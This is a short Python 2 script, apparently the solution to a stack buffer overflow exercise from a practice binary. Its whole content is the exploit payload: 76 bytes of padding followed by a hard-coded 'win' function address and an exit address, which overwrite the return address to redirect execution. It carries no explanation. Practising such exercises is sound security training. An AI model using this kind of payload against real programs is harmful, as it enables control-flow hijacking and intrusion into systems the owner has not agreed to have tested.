import struct

win_addr = 0x080483f4
exit_addr = 0xb7ec60c0
print "A"*76+struct.pack("<I",win_addr)+struct.pack("<I",exit_addr)
